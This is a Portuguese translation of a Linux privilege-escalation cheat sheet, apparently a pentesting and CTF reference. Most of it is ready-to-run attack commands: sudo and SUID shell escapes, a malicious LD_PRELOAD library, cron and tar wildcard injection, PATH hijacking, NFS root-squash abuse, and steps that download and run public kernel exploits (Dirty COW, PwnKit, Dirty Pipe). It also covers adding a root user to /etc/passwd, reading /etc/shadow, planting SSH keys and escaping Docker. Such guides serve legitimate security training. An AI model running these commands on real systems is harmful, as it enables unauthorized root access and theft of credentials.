# 🐧 Escalada de privilégios em Linux — guia de referência completo

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Notas de precisão e versão:** PwnKit afeta o pkexec do polkit e Baron Samedit afeta sudo; não são falhas do kernel, apesar de constarem nessa secção do original. As faixas de versões da tabela são resumos históricos e não substituem a confirmação das correções da distribuição. [PwnKit — investigação original](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) e [Baron Samedit — investigação original](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt). SUID/SGID são bits que podem alterar a identidade efetiva de execução; as capabilities repartem os privilégios tradicionais de root. A possibilidade de exploração depende do executável, da configuração e das permissões efetivas.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Guia completo de escalada de privilégios em sistemas Linux</b>
</p>

---

## 📋 Índice

- [Enumeração](#-enumeration)
- [SUID/SGID](#-suidsgid)
- [Capabilities (privilégios específicos do Linux)](#-capabilities)
- [Exploração de sudo](#-sudo-exploitation)
- [Tarefas cron](#-cron-jobs)
- [Apropriação da pesquisa de comandos através de PATH](#-path-hijacking)
- [Mapeamento de root em NFS (root squashing)](#-nfs-root-squashing)
- [Exploração de vulnerabilidades do kernel](#-kernel-exploits)
- [Procura de palavras-passe](#-password-mining)
- [Chaves SSH](#-ssh-keys)
- [Ficheiros com permissão de escrita](#-writable-files)
- [Evasão de contentores Docker](#-docker-escape)
- [Referência rápida](#-quick-reference)

---

<a id="-enumeration"></a>
## 🔍 Enumeração

### Informações do sistema

```bash
# Nome do sistema
hostname

# Sistema operativo e kernel
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Arquitetura
arch
uname -m

# Informações do CPU
cat /proc/cpuinfo
lscpu
```

### Informações dos utilizadores

```bash
# Utilizador atual
whoami
id

# Todos os utilizadores
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Grupos do utilizador
groups
cat /etc/group

# Utilizadores com sessão iniciada
w
who
users

# Últimos inícios de sessão
last
lastlog

# Privilégios de sudo
sudo -l
```

### Informações da rede

```bash
# Endereços IP
ip a
ifconfig

# Rotas
ip route
route -n

# Portas abertas
netstat -tulpn
ss -tulpn

# Ligações ativas
netstat -an
ss -an

# Cache ARP
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Sistemas
cat /etc/hosts
```

### Processos e serviços

```bash
# Processos em execução
ps aux
ps -ef
ps aux | grep root

# Serviços
systemctl list-units --type=service
service --status-all

# Pacotes instalados
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Tarefas agendadas

```bash
# Tabelas de tarefas cron (crontabs)
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Temporizadores do systemd
systemctl list-timers
```

---

<a id="-suidsgid"></a>
## 🔐 SUID/SGID

### Encontrar executáveis SUID

```bash
# Encontrar ficheiros SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Encontrar ficheiros SGID
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Encontrar ambos
find / -perm /6000 -type f 2>/dev/null
```

### Executáveis SUID comuns que podem ser explorados

Consulte os métodos de exploração no [GTFOBins](https://gtfobins.github.io/)!

#### **bash**
```bash
# Se bash tiver o bit SUID
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (versões antigas)
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**

> **Nota sobre o exemplo original:** as aspas simples impedem a expansão da substituição de comando, pelo que o texto não gera o hash indicado. Além disso, a cópia de segurança e o ficheiro alterado usam nomes diferentes; o excerto foi preservado e não deve ser interpretado como uma sequência correta de edição. [Regras de aspas do Bash](https://www.gnu.org/software/bash/manual/html_node/Single-Quotes.html).
```bash
# Copiar /etc/passwd, adicionar um utilizador root e copiar de volta
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

<a id="-capabilities"></a>
## ⚡ Capabilities (privilégios específicos do Linux)

### Encontrar capabilities

```bash
# Obter as capabilities dos ficheiros
getcap -r / 2>/dev/null

# Capabilities perigosas comuns
# CAP_SETUID — alterar o UID
# CAP_NET_RAW — sockets de rede em modo raw
# CAP_DAC_READ_SEARCH — ler qualquer ficheiro
```

### Explorar capabilities

#### **Python (cap_setuid)**
```bash
# Se python tiver cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (cap_dac_read_search)**
```bash
# Ler qualquer ficheiro
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

<a id="-sudo-exploitation"></a>
## 🔑 Exploração de sudo

### Verificar as permissões de sudo

```bash
sudo -l
# Procurar entradas NOPASSWD
# Procurar entradas (ALL) ou (root)
```

### Explorar sudo

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# Se existir env_keep+=LD_PRELOAD na saída de sudo -l
# Criar uma biblioteca maliciosa

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** (modo interativo)
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Divulga a primeira linha de shadow
```

### Exploração de vulnerabilidades de versões de sudo

```bash
# Verificar a versão
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

<a id="-cron-jobs"></a>
## ⏰ Tarefas cron

### Encontrar tarefas cron

```bash
# Tabela cron do sistema
cat /etc/crontab

# Diretórios cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Tabelas cron dos utilizadores
cat /var/spool/cron/crontabs/*

# Observar a execução de cron
# Utilizar pspy para monitorizar processos
```

### Explorar tarefas cron

#### **Script cron com permissão de escrita**
```bash
# Se cron executar um script no qual tem permissão de escrita:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Aguardar pela execução de cron e, depois:
/tmp/bash -p
```

#### **Injeção através de carateres universais no tar**
```bash
# Se cron executar: tar czf /tmp/backup.tar.gz *

# Criar ficheiros maliciosos
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **Exploração de PATH**
```bash
# Se cron utilizar um caminho relativo e conseguir controlar PATH
# A tabela cron indica: PATH=/home/user:/usr/local/bin:...
# O script invoca: backup.sh (sem caminho completo)

# Criar um script falso num diretório de PATH com permissão de escrita
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

<a id="-path-hijacking"></a>
## 🛤️ Apropriação da pesquisa de comandos através de PATH

### Encontrar scripts vulneráveis

```bash
# Procurar scripts executados por root que utilizem caminhos relativos
# Verificar scripts SUID
# Verificar os scripts de cron
# Verificar os serviços do systemd
```

### Explorar PATH

```bash
# Se um script de root invocar 'service' sem o caminho completo
# e conseguir controlar PATH:

# Criar um 'service' malicioso
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Executar o script vulnerável
./vulnerable_script
```

---

<a id="-nfs-root-squashing"></a>
## 📁 Mapeamento de root em NFS (root squashing)

### Encontrar partilhas NFS

```bash
# Na máquina do atacante
showmount -e target_ip

# Verificar as exportações
cat /etc/exports
# Procurar no_root_squash
```

### Explorar no_root_squash

```bash
# Na máquina do atacante (como root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# No alvo:
/share/bash -p
```

---

<a id="-kernel-exploits"></a>
## 💣 Exploração de vulnerabilidades do kernel

### Verificar a versão do kernel

```bash
uname -r
uname -a
cat /proc/version
```

### Vulnerabilidades comuns do kernel exploráveis

| CVE | Versão do kernel | Nome |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | Todas | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)
```bash
# Descarregar e compilar
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Descarregar
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Verificar primeiro a versão do kernel
uname -r

# Descarregar e compilar
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

<a id="-password-mining"></a>
## 🔑 Procura de palavras-passe

### Procurar palavras-passe

```bash
# Nos ficheiros
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Ficheiros de configuração
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# Ficheiros de histórico
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Ambiente
env
printenv
```

### Ficheiros de palavras-passe

```bash
# Ficheiro shadow (exige root)
cat /etc/shadow

# Hashes de palavras-passe do ficheiro shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Locais comuns

```bash
# Configurações Web
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Configurações de bases de dados
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Ficheiros de cópia de segurança
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

<a id="-ssh-keys"></a>
## 🔐 Chaves SSH

### Encontrar chaves SSH

```bash
# Chaves privadas
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Chaves autorizadas
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Explorar chaves SSH

```bash
# Se encontrar uma chave privada que consiga ler:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Adicionar a sua chave SSH

```bash
# Gerar a chave na máquina do atacante
ssh-keygen -t rsa -b 4096

# Se tiver permissão de escrita em authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

<a id="-writable-files"></a>
## 📝 Ficheiros com permissão de escrita

### Ficheiros críticos com permissão de escrita

```bash
# Verificar as permissões de escrita
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Explorar a permissão de escrita em /etc/passwd

```bash
# Gerar o hash da palavra-passe
openssl passwd -1 -salt hacker password
# Resultado: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Adicionar um utilizador root
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Iniciar sessão
su hacker
# Palavra-passe: password
```

### Encontrar ficheiros com escrita permitida a todos

> **Precisão:** `-writable` verifica o acesso de escrita do utilizador que executa find; não significa necessariamente escrita permitida a todos. [Manual GNU find](https://www.gnu.org/software/findutils/manual/find.pdf).

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# Diretórios com escrita permitida a todos
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

<a id="-docker-escape"></a>
## 🐳 Evasão de contentores Docker

### Verificar se está num contentor Docker

```bash
# Procurar .dockerenv
ls -la /.dockerenv

# Verificar os cgroups
cat /proc/1/cgroup | grep docker

# Verificar o nome do sistema (cadeia aleatória)
hostname
```

### Socket Docker montado

```bash
# Se docker.sock estiver montado
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Sair do contentor através do socket Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Contentor privilegiado

```bash
# Se o contentor for privilegiado
fdisk -l                    # Ver os discos do sistema anfitrião
mount /dev/sda1 /mnt
chroot /mnt
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Enumeração com comandos de uma linha

```bash
# Informações rápidas do sistema
id; hostname; uname -a; cat /etc/issue

# Pesquisa rápida de SUID
find / -perm -4000 -type f 2>/dev/null

# Pesquisa rápida de capabilities
getcap -r / 2>/dev/null

# Verificação rápida de sudo
sudo -l

# Verificação rápida de cron
cat /etc/crontab; ls -la /etc/cron*

# Pesquisa rápida de palavras-passe
grep -r "password" /home/ 2>/dev/null
```

### Ferramentas de automatização

| Ferramenta | Descrição |
|------|-------------|
| **LinPEAS** | Enumeração abrangente |
| **LinEnum** | Enumeração de Linux |
| **linux-smart-enumeration** | LSE |
| **pspy** | Monitor de processos |

### Lista de verificação de oportunidades imediatas

- [ ] `sudo -l` — Verificar as permissões de sudo
- [ ] Executáveis SUID — Encontrar e consultar o GTFOBins
- [ ] Capabilities — `getcap -r / 2>/dev/null`
- [ ] Tarefas cron — Há scripts com permissão de escrita?
- [ ] Versão do kernel — Há vulnerabilidades exploráveis conhecidas?
- [ ] Permissão de leitura em /etc/shadow
- [ ] Permissão de escrita em /etc/passwd
- [ ] Chaves SSH em /home/* ou /root
- [ ] Socket Docker montado
- [ ] NFS com no_root_squash

---

## 📚 Recursos

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Guias de referência relacionados
- LinPEAS — o guia local referido no original não está incluído nesta cópia; consulte o [projeto oficial PEASS-ng](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).
- [Escalada de privilégios em Windows](../../Windows-PrivEsc/translations/README.pt.md)

---

<p align="center">
  <b>🐧 Obtenha acesso root!</b><br>
  <i>Domine a escalada de privilégios em Linux</i>
</p>
